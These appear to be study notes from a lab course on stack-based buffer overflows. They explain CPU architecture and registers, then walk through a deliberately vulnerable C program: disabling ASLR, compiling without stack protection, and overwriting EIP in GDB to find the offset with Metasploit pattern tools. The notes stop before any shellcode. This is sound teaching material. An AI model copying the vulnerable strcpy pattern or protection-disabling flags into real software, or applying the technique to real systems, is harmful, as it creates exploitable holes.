**Page 1 / Buffer Overflows Overview**

# Buffer Overflows Overview

Buffer overflows are among the most common security vulnerabilities in software applications that can be exploited over the Internet. In short, buffer overflows are caused by incorrect program code, which cannot process too large amounts of data correctly by the CPU and can, therefore, manipulate the CPU's processing.

Suppose too much data is written to a reserved memory `buffer` or `stack` that is not limited, for example. In that case, specific registers will be overwritten, which may allow code to be executed.

A buffer overflow can cause the program to crash, corrupt data, or harm data structures in the program's runtime. The last of these can overwrite the specific program's `return address` with arbitrary data, allowing an attacker to execute commands with the `privileges of the process` vulnerable to the buffer overflow by passing arbitrary machine code. This code is usually intended to give us more convenient access to the system to use it for our own purposes. Such buffer overflows in common servers, and Internet worms also exploit client software.

A particularly popular target on Unix systems is root access, which gives us all permissions to access the system. However, as is often misunderstood, this does not mean that a buffer overflow that "only" leads to the privileges of a standard user is harmless. Getting the coveted root access is often much easier if you already have user privileges.

Buffer overflows, in addition to programming carelessness, are mainly made possible by computer systems based on the Von-Neumann architecture.

The most significant cause of buffer overflows is the use of programming languages that do not automatically monitor limits of memory buffer or stack to prevent (stack-based) buffer overflow. These include the `C` and `C++` languages, which emphasize performance and do not require monitoring.

For this reason, developers are forced to define such areas in the programming code themselves, which increases vulnerability many times over. These areas are often left undefined for testing purposes or due to carelessness. Even if they were used for testing purposes, they might have been overlooked at the end of the development process.

**Page 2 / Exploit Development Introduction**

# Exploit Development Introduction

Exploit development comes in the `Exploitation Phase` after specific software and even its versions have been identified. The Exploitation Phase goal is to use the information found and its analysis to exploit the potential ways to gain interaction and/or access to the target system.

Developing our own exploits can be very complex and requires a deep understanding of CPU operations and the software's functions that serve as our target. Many exploits are written in different programming languages. One of the most popular programming languages for this is `Python` because it is easy to understand and easy to write with. In this module, we will focus on basic techniques for exploit development, as a `fundamental understanding` must be developed before we can deal with the various security mechanisms of memory.

Before we run any exploits, we need to understand what an exploit is. An exploit is a code that causes the service to perform an operation we want by abusing the found vulnerability. Such codes often serve as `proof-of-concept` (`POC`) in our reports.

There are two types of exploits. One is unknown (`0-day` exploits), and the other is known (`N-day` exploits).

---

#### 0-Day Exploits

An `0-day exploit` is a code that exploits a newly identified vulnerability in a specific application. The vulnerability does not need to be public in the application. The danger with such exploits is that if the developers of this application are not informed about the vulnerability, they will likely persist with new updates.

---

#### N-Day Exploits

If the vulnerability is published and informs the developers, they will still need time to write a fix to prevent them as soon as possible. When they are published, they talk about `N-day exploits`, counting the days between the publication of the exploit and an attack on the unpatched systems.

Also, these exploits can be divided into four different categories:

-   `Local`
-   `Remote`
-   `DoS`
-   `WebApp`

---

#### Local Exploits

Local exploits / Privilege Escalation exploits can be executed when opening a file. However, the prerequisite for this is that the local software contains a security vulnerability. Often a local exploit (e.g., in a PDF document or as a macro in a Word or Excel file) first tries to exploit security holes in the program with which the file was imported to achieve a higher privilege level and thus load and execute `malicious code` / `shellcode` in the operating system. The actual action that the exploit performs is called `payload`.

---

#### Remote Exploits

The remote exploits very often exploit the buffer overflow vulnerability to get the payload running on the system. This type of exploits differs from local exploits because they can be executed over the network to perform the desired operation.

---

#### DoS Exploits

DoS (`Denial of Service`) exploits are codes that prevent other systems from functioning, i.e., cause a crash of individual software or the entire system.

---

#### WebApp Exploits

A Web application exploit uses a vulnerability in such software. Such vulnerabilities can, for example, allow a command injection on the application itself or the underlying database.

**Page 3 / CPU Architecture**

The architecture of the `Von-Neumann` was developed by the Hungarian mathematician John von Neumann, and it consists of four functional units:

-   `Memory`
-   `Control Unit`
-   `Arithmetical Logical Unit`
-   `Input/Output Unit`

In the Von-Neumann architecture, the most important units, the `Arithmetical Logical Unit` (`ALU`) and `Control Unit` (`CU`), are combined in the actual `Central Processing Unit` (`CPU`). The `CPU` is responsible for executing the `instructions` and for `flow control`. The instructions are executed one after the other, step by step. The commands and data are fetched from memory by the `CU`. The connection between processor, memory, and input/output unit is called a `bus system`, which is not mentioned in the original Von-Neumann architecture but plays an essential role in practice. In the Von-Neumann architecture, all instructions and data are transferred via the `bus system`.

#### Von-Neumann Architecture

![image](https://academy.hackthebox.com/storage/modules/31/von_neumann3.png)

---

## Memory

The memory can be divided into two different categories:

-   `Primary Memory`
-   `Secondary Memory`

---

#### Primary Memory

The `primary memory` is the `Cache` and `Random Access Memory` (`RAM`). If we think about it logically, memory is nothing more than a place to store information. We can think of it as leaving something at one of our friends to pick it up again later. But for this, it is necessary to know the friend's `address` to pick up what we have left behind. It is the same as `RAM`. RAM describes a memory type whose memory allocations can be accessed directly and randomly by their `memory addresses`.

The `cache` is integrated into the processor and serves as a buffer, which in the best case, ensures that the processor is always fed with data and program code. Before the program code and data enter the processor for processing, the RAM serves as data storage. The size of the RAM determines the amount of data that can be stored for the processor. However, when the primary memory loses power, all stored contents are lost.

---

#### Secondary Memory

The `secondary memory` is the external data storage, such as `HDD/SSD`, `Flash Drives` and `CD/DVD-ROMs` of a computer, which is `not` directly accessed by the CPU, but via the `I/O` interfaces. In other words, it is a mass storage device. It is used to permanently store data that does not need to be processed at the moment. Compared to `primary memory`, it has a higher storage capacity, can store data permanently even without a power supply, and works much slower.

---

## Control Unit

The `Control Unit` (`CU`) is responsible for the correct interworking of the processor's individual parts. An internal bus connection is used for the tasks of the `CU`. The tasks of the `CU` can be summarised as follows:

-   Reading data from the RAM
-   Saving data in RAM
-   Provide, decode and execute an instruction
-   Processing the inputs from peripheral devices
-   Processing of outputs to peripheral devices
-   Interrupt control
-   Monitoring of the entire system

The `CU` contains the `Instruction Register` (`IR`), which contains all instructions that the processor decodes and executes accordingly. The instruction decoder translates the instructions and passes them to the execution unit, which then executes the instruction. The execution unit transfers the data to the `ALU` for calculation and receives the result back from there. The data used during execution is temporarily stored in `registers`.

---

## Central Processing Unit

The `Central Processing Unit` (`CPU`) is the functional unit in a computer that provides the actual processing power. It is responsible for processing information and controlling the processing operations. To do this, the `CPU` fetches commands from memory one after the other and initiates data processing.

The processor is also often referred to as a `Microprocessor` when placed in a single electronic circuit, as in our PCs.

Each `CPU` has an architecture on which it was built. The best-known `CPU architectures` are:

-   `x86`/`i386` - (AMD & Intel)
-   `x86-64`/`amd64` - (Microsoft & Sun)
-   `ARM` - (Acorn)

Each of these CPU architectures is built in a specific way, called `Instruction Set Architecture` (`ISA`), which the CPU uses to execute its processes. `ISA`, therefore, describes the behavior of a CPU concerning the instruction set used. The instruction sets are defined so that they are independent of a specific implementation. Above all, ISA gives us the possibility to understand the unified behavior of `machine code` in `assembly language` concerning `registers`, `data types`, etc.

There are four different types of `ISA`:

-   `CISC` - `Complex Instruction Set Computing`
-   `RISC` - `Reduced Instruction Set Computing`
-   `VLIW` - `Very Long Instruction Word`
-   `EPIC` - `Explicitly Parallel Instruction Computing`

---

#### RISC

`RISC` stands for `Reduced Instruction Set Computer`, a design of microprocessors architecture that aimed to simplify the complexity of the instruction set for assembly programming to one clock cycle. This leads to higher clock frequencies of the CPU but enables a faster execution because smaller instruction sets are used. By an instruction set, we mean the set of machine instructions that a given processor can execute. We can find `RISC` in most smartphones today, for example. Nevertheless, pretty much all CPUs have a portion of `RISC` in them. `RISC` architectures have a fixed length of instructions defined as `32-bit` and `64-bit`.

---

#### CISC

In contrast to RISC, the `Complex Instruction Set Computer` (`CISC`) is a processor architecture with an extensive and complex instruction set. Due to the historical development of computers and their memory, recurring sequences of instructions were combined into complicated instructions in second-generation computers. The addressing in `CISC` architectures does not require 32-bit or 64-bit in contrast to RISC but can be done with an `8-bit` mode.

---

#### Instruction Cycle

The instruction set describes the totality of the machine instructions of a processor. The scope of the instruction set varies considerably depending on the processor type. Each CPU may have different instruction cycles and instruction sets, but they are all similar in structure, which we can summarize as follows:

```
Instruction             Description
```

1. **FETCH:** The next machine instruction address is read from the `Instruction Address Register` (`IAR`). It is then loaded from the `Cache` or `RAM` into the `Instruction Register` (`IR`).

2. **DECODE:**  The instruction decoder converts the instructions and starts the necessary circuits to execute the instruction.

3. **FETCH OPERANDS:** If further data have to be loaded for execution, these are loaded from the cache or `RAM` into the working registers.

4. **EXECUTE:** The instruction is executed. This can be, for example, operations in the `ALU`, a jump in the program, the writing back of results into the working registers, or the control of peripheral devices. Depending on the result of some instructions, the status register is set, which can be evaluated by subsequent instructions.

5. **UPDATE INSTRUCTION POINTER:** If no jump instruction has been executed in the EXECUTE phase, the `IAR` is now increased by the length of the instruction so that it points to the next machine instruction.

**Page 4 /  Stack-Based Buffer Overflow**

# Stack-Based Buffer Overflow

Buffer overflows are the operating system's reaction to an error in existing software or during the execution of these. This is responsible for most of the security vulnerabilities in program flows in the last decade. Programming errors often occur, leading to buffer overflows due to inattention when programming with low abstract languages such as `C` or `C++`.

These languages are compiled almost directly to machine code and, in contrast to highly abstracted languages such as Java or Python, run through little to no control structure operating system. Buffer overflows are errors that allow data that is too large to fit into a buffer of the operating system's memory that is not large enough, thereby overflowing this buffer. As a result of this mishandling, the memory of other functions of the executed program is overwritten, potentially creating a security vulnerability.

Such a program (binary file), is a general executable file stored on a data storage medium. There are several different file formats for such executable binary files. For example, the `Portable Executable Format` (`PE`) is used on Microsoft platforms.

Another format for executable files is the `Executable and Linking Format` (`ELF`), supported by almost all modern `UNIX` variants. If the linker loads such an executable binary file and the program will be executed, the corresponding program code will be loaded into the main memory and then executed by the CPU.

Programs store data and instructions in memory during initialization and execution. These are data that are displayed in the executed software or entered by the user. Especially for expected user input, a buffer must be created beforehand by saving the input.

The instructions are used to model the program flow. Among other things, return addresses are stored in the memory, which refers to other memory addresses and thus define the program's control flow. If such a return address is deliberately overwritten by using a buffer overflow, an attacker can manipulate the program flow by having the return address refer to another function or subroutine. Also, it would be possible to jump back to a code previously introduced by the user input.

To understand how it works on the technical level, we need to become familiar with how:

-   the memory is divided and used
-   the debugger displays and names the individual instructions
-   the debugger can be used to detect such vulnerabilities
-   we can manipulate the memory

Another critical point is that the exploits usually only work for a specific version of the software and operating system. Therefore, we have to rebuild and reconfigure the target system to bring it to the same state. After that, the program we are investigating is installed and analyzed. Most of the time, we will only have one attempt to exploit the program if we miss the opportunity to restart it with elevated privileges.

---

## The Memory

When the program is called, the sections are mapped to the segments in the process, and the segments are loaded into memory as described by the `ELF` file.

#### Buffer

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_1.png)

#### .text

The `.text` section contains the actual assembler instructions of the program. This area can be read-only to prevent the process from accidentally modifying its instructions. Any attempt to write to this area will inevitably result in a segmentation fault.

---

#### .data

The `.data` section contains global and static variables that are explicitly initialized by the program.

---

#### .bss

Several compilers and linkers use the `.bss` section as part of the data segment, which contains statically allocated variables represented exclusively by 0 bits.

---

#### The Heap

`Heap memory` is allocated from this area. This area starts at the end of the ".bss" segment and grows to the higher memory addresses.

---

#### The Stack

`Stack memory` is a `Last-In-First-Out` data structure in which the return addresses, parameters, and, depending on the compiler options, frame pointers are stored. `C/C++` local variables are stored here, and you can even copy code to the stack. The `Stack` is a defined area in `RAM`. The linker reserves this area and usually places the stack in RAM's lower area above the global and static variables. The contents are accessed via the `stack pointer`, set to the upper end of the stack during initialization. During execution, the allocated part of the stack grows down to the lower memory addresses.

Modern memory protections (`DEP`/`ASLR`) would prevent the execution of such code against buffer overflows.

---

## Vulnerable Program

We are now writing a simple C-program called `bow.c` with a vulnerable function called `strcpy()`.

#### Bow.c

Code: c

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bowfunc(char *string) {

	char buffer[1024];
	strcpy(buffer, string);
	return 1;
}

int main(int argc, char *argv[]) {

	bowfunc(argv[1]);
	printf("Done.\n");
	return 1;
}
```

#### Disable ASLR

Disable ASLR

```shell-session
student@nix-bow:~$ sudo su
root@nix-bow:/home/student# echo 0 > /proc/sys/kernel/randomize_va_space
root@nix-bow:/home/student# cat /proc/sys/kernel/randomize_va_space

0
```

Next, we compile the C code into a 32bit ELF binary.

#### Compilation

Compilation

```shell-session
student@nix-bow:~$ gcc bow.c -o bow32 -fno-stack-protector -z execstack -m32
student@nix-bow:~$ file bow32 | tr "," "\n"

bow: ELF 32-bit LSB shared object
 Intel 80386
 version 1 (SYSV)
 dynamically linked
 interpreter /lib/ld-linux.so.2
 for GNU/Linux 3.2.0
 BuildID[sha1]=93dda6b77131deecaadf9d207fdd2e70f47e1071
 not stripped
```

---

## Vulnerable C Functions

There are several vulnerable functions in the C programming language that do not independently protect the memory. Here are some of the functions:

-   `strcpy`
-   `gets`
-   `sprintf`
-   `scanf`
-   `strcat`
-   ...

---

## GDB Introductions

GDB, or the GNU Debugger, is the standard debugger of Linux systems developed by the GNU Project. It has been ported to many systems and supports the programming languages C, C++, Objective-C, FORTRAN, Java, and many more.

GDB provides us with the usual traceability features like breakpoints or stack trace output and allows us to intervene in the execution of programs. It also allows us, for example, to manipulate the variables of the application or to call functions independently of the normal execution of the program.

We use `GNU Debugger` (`GDB`) to view the created binary on the assembler level. Once we have executed the binary with `GDB`, we can disassemble the program's main function.

#### GDB - AT&T Syntax

GDB - AT&T Syntax

```shell-session
student@nix-bow:~$ gdb -q bow32

Reading symbols from bow...(no debugging symbols found)...done.
(gdb) disassemble main

Dump of assembler code for function main:
   0x00000582 <+0>: 	lea    0x4(%esp),%ecx
   0x00000586 <+4>: 	and    $0xfffffff0,%esp
   0x00000589 <+7>: 	pushl  -0x4(%ecx)
   0x0000058c <+10>:	push   %ebp
   0x0000058d <+11>:	mov    %esp,%ebp
   0x0000058f <+13>:	push   %ebx
   0x00000590 <+14>:	push   %ecx
   0x00000591 <+15>:	call   0x450 <__x86.get_pc_thunk.bx>
   0x00000596 <+20>:	add    $0x1a3e,%ebx
   0x0000059c <+26>:	mov    %ecx,%eax
   0x0000059e <+28>:	mov    0x4(%eax),%eax
   0x000005a1 <+31>:	add    $0x4,%eax
   0x000005a4 <+34>:	mov    (%eax),%eax
   0x000005a6 <+36>:	sub    $0xc,%esp
   0x000005a9 <+39>:	push   %eax
   0x000005aa <+40>:	call   0x54d <bowfunc>
   0x000005af <+45>:	add    $0x10,%esp
   0x000005b2 <+48>:	sub    $0xc,%esp
   0x000005b5 <+51>:	lea    -0x1974(%ebx),%eax
   0x000005bb <+57>:	push   %eax
   0x000005bc <+58>:	call   0x3e0 <puts@plt>
   0x000005c1 <+63>:	add    $0x10,%esp
   0x000005c4 <+66>:	mov    $0x1,%eax
   0x000005c9 <+71>:	lea    -0x8(%ebp),%esp
   0x000005cc <+74>:	pop    %ecx
   0x000005cd <+75>:	pop    %ebx
   0x000005ce <+76>:	pop    %ebp
   0x000005cf <+77>:	lea    -0x4(%ecx),%esp
   0x000005d2 <+80>:	ret    
End of assembler dump.

```

In the first column, the hexadecimal numbers represent the `memory addresses`. The numbers with the plus sign (`+`) show the `address jumps` in memory in bytes, used for the respective instruction. Next, we can see the `assembler instructions` (`mnemonics`) with registers and their `operation suffixes`. The current syntax is `AT&T`, which we can recognize by the `%` and `$` characters.

```
Memory Address  Address Jumps   Assembler Instruction   Operation Suffixes

0x00000582       <+0>:                lea                  0x4(%esp),%ecx

0x00000586       <+4>:                and                  $0xfffffff0,%esp

...               ...                 ...                         ...
```

The `Intel` syntax makes the disassembled representation easier to read, and we can change the syntax by entering the following commands in GDB:

#### GDB - Change the Syntax to Intel

GDB - Change the Syntax to Intel

```shell-session
(gdb) set disassembly-flavor intel
(gdb) disassemble main

Dump of assembler code for function main:
   0x00000582 <+0>:	    lea    ecx,[esp+0x4]
   0x00000586 <+4>:	    and    esp,0xfffffff0
   0x00000589 <+7>:	    push   DWORD PTR [ecx-0x4]
   0x0000058c <+10>:	push   ebp
   0x0000058d <+11>:	mov    ebp,esp
   0x0000058f <+13>:	push   ebx
   0x00000590 <+14>:	push   ecx
   0x00000591 <+15>:	call   0x450 <__x86.get_pc_thunk.bx>
   0x00000596 <+20>:	add    ebx,0x1a3e
   0x0000059c <+26>:	mov    eax,ecx
   0x0000059e <+28>:	mov    eax,DWORD PTR [eax+0x4]
<SNIP>
```

We don't have to change the display mode manually continually. We can also set this as the default syntax with the following command.

#### Change GDB Syntax

Change GDB Syntax

```shell-session
student@nix-bow:~$ echo 'set disassembly-flavor intel' > ~/.gdbinit
```

If we now rerun GDB and disassemble the main function, we see the Intel syntax.

#### GDB - Intel Syntax

GDB - Intel Syntax

```shell-session
student@nix-bow:~$ gdb ./bow32 -q

Reading symbols from bow...(no debugging symbols found)...done.
(gdb) disassemble main

Dump of assembler code for function main:
   0x00000582 <+0>: 	lea    ecx,[esp+0x4]
   0x00000586 <+4>: 	and    esp,0xfffffff0
   0x00000589 <+7>: 	push   DWORD PTR [ecx-0x4]
   0x0000058c <+10>:	push   ebp
   0x0000058d <+11>:	mov    ebp,esp
   0x0000058f <+13>:	push   ebx
   0x00000590 <+14>:	push   ecx
   0x00000591 <+15>:	call   0x450 <__x86.get_pc_thunk.bx>
   0x00000596 <+20>:	add    ebx,0x1a3e
   0x0000059c <+26>:	mov    eax,ecx
   0x0000059e <+28>:	mov    eax,DWORD PTR [eax+0x4]
   0x000005a1 <+31>:	add    eax,0x4
   0x000005a4 <+34>:	mov    eax,DWORD PTR [eax]
   0x000005a6 <+36>:	sub    esp,0xc
   0x000005a9 <+39>:	push   eax
   0x000005aa <+40>:	call   0x54d <bowfunc>
   0x000005af <+45>:	add    esp,0x10
   0x000005b2 <+48>:	sub    esp,0xc
   0x000005b5 <+51>:	lea    eax,[ebx-0x1974]
   0x000005bb <+57>:	push   eax
   0x000005bc <+58>:	call   0x3e0 <puts@plt>
   0x000005c1 <+63>:	add    esp,0x10
   0x000005c4 <+66>:	mov    eax,0x1
   0x000005c9 <+71>:	lea    esp,[ebp-0x8]
   0x000005cc <+74>:	pop    ecx
   0x000005cd <+75>:	pop    ebx
   0x000005ce <+76>:	pop    ebp
   0x000005cf <+77>:	lea    esp,[ecx-0x4]
   0x000005d2 <+80>:	ret    
End of assembler dump.
```

The difference between the `AT&T` and `Intel` syntax is not only in the presentation of the instructions with their symbols but also in the order and direction in which the instructions are executed and read.

Let us take the following instruction as an example:

GDB - Intel Syntax

```shell-session
   0x0000058d <+11>:	mov    ebp,esp
```

With the Intel syntax, we have the following order for the instruction from the example:

## Intel Syntax

```
Instruction             Destination                      Source
-----------------------------------------------------------------------------

mov                        ebp                             esp
```

## AT&T Syntax
```
Instruction                 Source                Destination
-----------------------------------------------------------------------------

mov                          %esp                    %ebp
```


**HTB Academy Question**

Q: At which address in the "main" function is the "bowfunc" function gets called?

A: 0x000005aa

**Solution**

Connect to the ssh and you can see `bow` binary there run the binary in `gdb` program with the following command 
```shell
$ gdb -q bow
```
This will load the binary in `gdb` after that use the following command in `gdb`
```gdb
(gdb) disassemble main
```

After that you will see main function there you just have to find the line where they call bow function they are like following
```
0x000005aa <+40>:	call   0x54d <bowfunc>
```

**Page 5 / CPU Registers**

# CPU Registers

Registers are the essential components of a CPU. Almost all registers offer a small amount of storage space where data can be temporarily stored. However, some of them have a particular function.

These registers will be divided into General registers, Control registers, and Segment registers. The most critical registers we need are the General registers. In these, there are further subdivisions into Data registers, Pointer registers, and Index registers.

#### Data registers

**`32-bit Register`**  **`64-bit Register`**  **`Description`**

1. `EAX`  `RAX`  `Accumulator is used in input/output and for arithmetic operations`

2. `EBX`  `RBX`  `Base is used in indexed addressing`

3. `ECX` `RCX` `Counter is used to rotate instructions and count loops`

4. `EDX` `RDX` `Data is used for I/O and in arithmetic operations for multiply and divide operations involving large values`

---

#### Pointer registers

**`32-bit Register`** **`64-bit Register`** **`Description`**

1. `EIP` `RIP` `Instruction Pointer stores the offset address of the next instruction to be executed`

2. `ESP` `RSP` `Stack Pointer points to the top of the stack`

3. `EBP` `RBP` ``Base Pointer is also known as `Stack Base Pointer` or `Frame Pointer` thats points to the base of the stack``

---

## Stack Frames

Since the stack starts with a high address and grows down to low memory addresses as values are added, the `Base Pointer` points to the beginning (base) of the stack in contrast to the `Stack Pointer`, which points to the top of the stack.

As the stack grows, it is logically divided into regions called `Stack Frames`, which allocate the required memory in the stack for the corresponding function. A stack frame defines a frame of data with the beginning (`EBP`) and the end (`ESP`) that is pushed onto the stack when a function is called.

Since the stack memory is built on a `Last-In-First-Out` (`LIFO`) data structure, the first step is to store the `previous EBP` position on the stack, which can be restored after the function completes. If we now look at the `bowfunc` function, it looks like following in GDB:

Pointer registers

```shell-session
(gdb) disas bowfunc 

Dump of assembler code for function bowfunc:
   0x0000054d <+0>:	    push   ebp       # <---- 1. Stores previous EBP
   0x0000054e <+1>:	    mov    ebp,esp
   0x00000550 <+3>:	    push   ebx
   0x00000551 <+4>:	    sub    esp,0x404
   <...SNIP...>
   0x00000580 <+51>:	leave  
   0x00000581 <+52>:	ret    
```

The `EBP` in the stack frame is set first when a function is called and contains the `EBP` of the previous stack frame. Next, the value of the `ESP` is copied to the `EBP`, creating a new stack frame.

Pointer registers

```shell-session
(gdb) disas bowfunc 

Dump of assembler code for function bowfunc:
   0x0000054d <+0>:	    push   ebp       # <---- 1. Stores previous EBP
   0x0000054e <+1>:	    mov    ebp,esp   # <---- 2. Creates new Stack Frame
   0x00000550 <+3>:	    push   ebx
   0x00000551 <+4>:	    sub    esp,0x404 
   <...SNIP...>
   0x00000580 <+51>:	leave  
   0x00000581 <+52>:	ret    
```

Then some space is created in the stack, moving the `ESP` to the top for the operations and variables needed and processed.

#### Prologue

Prologue

```shell-session
(gdb) disas bowfunc 

Dump of assembler code for function bowfunc:
   0x0000054d <+0>:	    push   ebp       # <---- 1. Stores previous EBP
   0x0000054e <+1>:	    mov    ebp,esp   # <---- 2. Creates new Stack Frame
   0x00000550 <+3>:	    push   ebx
   0x00000551 <+4>:	    sub    esp,0x404 # <---- 3. Moves ESP to the top
   <...SNIP...>
   0x00000580 <+51>:	leave  
   0x00000581 <+52>:	ret    
```

These three instructions represent the so-called `Prologue`.

For getting out of the stack frame, the opposite is done, the `Epilogue`. During the epilogue, the `ESP` is replaced by the current `EBP`, and its value is reset to the value it had before in the prologue. The epilogue is relatively short, and apart from other possibilities to perform it, in our example, it is performed with two instructions:

#### Epilogue

Epilogue

```shell-session
(gdb) disas bowfunc 

Dump of assembler code for function bowfunc:
   0x0000054d <+0>:	    push   ebp       
   0x0000054e <+1>:	    mov    ebp,esp   
   0x00000550 <+3>:	    push   ebx
   0x00000551 <+4>:	    sub    esp,0x404 
   <...SNIP...>
   0x00000580 <+51>:	leave  # <----------------------
   0x00000581 <+52>:	ret    # <--- Leave stack frame
```

---

#### Index registers

**`Register 32-bit`** **`Register 64-bit`** **`Description`**

1. `ESI` `RSI` `Source Index is used as a pointer from a source for string operations`

2. `EDI` `RDI` `Destination is used as a pointer to a destination for string operations`

---

Another important point concerning the representation of the assembler is the naming of the registers. This depends on the format in which the binary was compiled. We have used GCC to compile the `bow.c` code in 32-bit format. Now let's compile the same code into a `64-bit` format.

#### Compile in 64-bit Format

Compile in 64-bit Format

```shell-session
student@nix-bow:~$ gcc bow.c -o bow64 -fno-stack-protector -z execstack -m64
student@nix-bow:~$ file bow64 | tr "," "\n"

bow64: ELF 64-bit LSB shared object
 x86-64
 version 1 (SYSV)
 dynamically linked
 interpreter /lib64/ld-linux-x86-64.so.2
 for GNU/Linux 3.2.0
 BuildID[sha1]=9503477016e8604e808215b4babb250ed25a7b99
 not stripped
```

So if we now look at the assembler code, we see that the addresses are twice as big, and we have almost half of the instructions as with a 32-bit compiled binary.

Compile in 64-bit Format

```shell-session
student@nix-bow:~$ gdb -q bow64

Reading symbols from bow64...(no debugging symbols found)...done.
(gdb) disas main

Dump of assembler code for function main:
   0x00000000000006bc <+0>: 	push   rbp
   0x00000000000006bd <+1>: 	mov    rbp,rsp
   0x00000000000006c0 <+4>: 	sub    rsp,0x10
   0x00000000000006c4 <+8>:  	mov    DWORD PTR [rbp-0x4],edi
   0x00000000000006c7 <+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x00000000000006cb <+15>:	mov    rax,QWORD PTR [rbp-0x10]
   0x00000000000006cf <+19>:	add    rax,0x8
   0x00000000000006d3 <+23>:	mov    rax,QWORD PTR [rax]
   0x00000000000006d6 <+26>:	mov    rdi,rax
   0x00000000000006d9 <+29>:	call   0x68a <bowfunc>
   0x00000000000006de <+34>:	lea    rdi,[rip+0x9f]
   0x00000000000006e5 <+41>:	call   0x560 <puts@plt>
   0x00000000000006ea <+46>:	mov    eax,0x1
   0x00000000000006ef <+51>:	leave  
   0x00000000000006f0 <+52>:	ret    
End of assembler dump.

```

However, we will first take a look at the 32-bit version of the vulnerable binary. The most important instruction for us right now is the `call` instruction. The `call` instruction is used to call a function and performs two operations:

1.  it pushes the return address onto the `stack` so that the execution of the program can be continued after the function has successfully fulfilled its goal,
2.  it changes the `instruction pointer` (`EIP`) to the call destination and starting execution there.

#### GDB - Intel Syntax

GDB - Intel Syntax

```shell-session
student@nix-bow:~$ gdb ./bow32 -q

Reading symbols from bow...(no debugging symbols found)...done.
(gdb) disassemble main

Dump of assembler code for function main:
   0x00000582 <+0>: 	lea    ecx,[esp+0x4]
   0x00000586 <+4>: 	and    esp,0xfffffff0
   0x00000589 <+7>: 	push   DWORD PTR [ecx-0x4]
   0x0000058c <+10>:	push   ebp
   0x0000058d <+11>:	mov    ebp,esp
   0x0000058f <+13>:	push   ebx
   0x00000590 <+14>:	push   ecx
   0x00000591 <+15>:	call   0x450 <__x86.get_pc_thunk.bx>
   0x00000596 <+20>:	add    ebx,0x1a3e
   0x0000059c <+26>:	mov    eax,ecx
   0x0000059e <+28>:	mov    eax,DWORD PTR [eax+0x4]
   0x000005a1 <+31>:	add    eax,0x4
   0x000005a4 <+34>:	mov    eax,DWORD PTR [eax]
   0x000005a6 <+36>:	sub    esp,0xc
   0x000005a9 <+39>:	push   eax
   0x000005aa <+40>:	call   0x54d <bowfunc>		# <--- CALL function
<SNIP>
```

---

## Endianness

During load and save operations in registers and memories, the bytes are read in a different order. This byte order is called `endianness`. Endianness is distinguished between the `little-endian` format and the `big-endian` format.

`Big-endian` and `little-endian` are about the order of valence. In `big-endian`, the digits with the highest valence are initially. In `little-endian`, the digits with the lowest valence are at the beginning. Mainframe processors use the `big-endian` format, some RISC architectures, minicomputers, and in TCP/IP networks, the byte order is also in `big-endian` format.

Now, let us look at an example with the following values:

-   Address: `0xffff0000`
-   Word: `\xAA\xBB\xCC\xDD`

```
Memory Address 0xffff0000  0xffff0001  0xffff0002 0xffff0003

Big-Endian       AA           BB          CC         DD

Little-Endian    DD           CC          BB         AA
```

This is very important for us to enter our code in the right order later when we have to tell the CPU to which address it should point.

**Page 6 / Take Control of EIP**

# Take Control of EIP

One of the most important aspects of a stack-based buffer overflow is to get the `instruction pointer` (`EIP`) under control, so we can tell it to which address it should jump. This will make the `EIP` point to the address where our `shellcode` starts and causes the CPU to execute it.

We can execute commands in GDB using Python, which serves us directly as input.

#### Segmentation Fault

Segmentation Fault

```shell-session
student@nix-bow:~$ gdb -q bow32

(gdb) run $(python -c "print '\x55' * 1200")
Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1200")

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

If we insert 1200 "`U`"s (hex "`55`") as input, we can see from the register information that we have overwritten the `EIP`. As far as we know, the `EIP` points to the next instruction to be executed.

Segmentation Fault

```shell-session
(gdb) info registers 

eax            0x1	1
ecx            0xffffd6c0	-10560
edx            0xffffd06f	-12177
ebx            0x55555555	1431655765
esp            0xffffcfd0	0xffffcfd0
ebp            0x55555555	0x55555555		# <---- EBP overwritten
esi            0xf7fb5000	-134524928
edi            0x0	0
eip            0x55555555	0x55555555		# <---- EIP overwritten
eflags         0x10286	[ PF SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```

If we want to imagine the process visually, then the process looks something like this.

#### Buffer

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_2.png)

This means that we have to write access to the EIP. This, in turn, allows specifying to which memory address the EIP should jump. However, to manipulate the register, we need an exact number of U's up to the EIP so that the following 4 bytes can be overwritten with our desired memory address.

---

## Determine The Offset

The offset is used to determine how many bytes are needed to overwrite the buffer and how much space we have around our shellcode.

Shellcode is a program code that contains instructions for an operation that we want the CPU to perform. The manual creation of the shellcode will be discussed in more detail in other modules. But to save some time first, we use the Metasploit Framework (MSF) that offers a Ruby script called “pattern_create” that can help us determine the exact number of bytes to reach the EIP. It creates a unique string based on the length of bytes you specify to help determine the offset.

#### Create Pattern

Create Pattern

```shell-session
W4H33D@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
W4H33D@htb[/htb]$ cat pattern.txt

Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9
```

Now we replace our 1200 "`U`"s with the generated patterns and focus our attention again on the EIP.

#### GDB - Using Generated Pattern

GDB - Using Generated Pattern

```shell-session
(gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'") 

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'")
Program received signal SIGSEGV, Segmentation fault.
0x69423569 in ?? ()
```

#### GDB - EIP

GDB - EIP

```shell-session
(gdb) info registers eip

eip            0x69423569	0x69423569
```

We see that the `EIP` displays a different memory address, and we can use another MSF tool called "`pattern_offset`" to calculate the exact number of characters (offset) needed to advance to the `EIP`.

#### GDB - Offset

GDB - Offset

```shell-session
W4H33D@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569

[*] Exact match at offset 1036
```

#### Buffer

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_3.png)

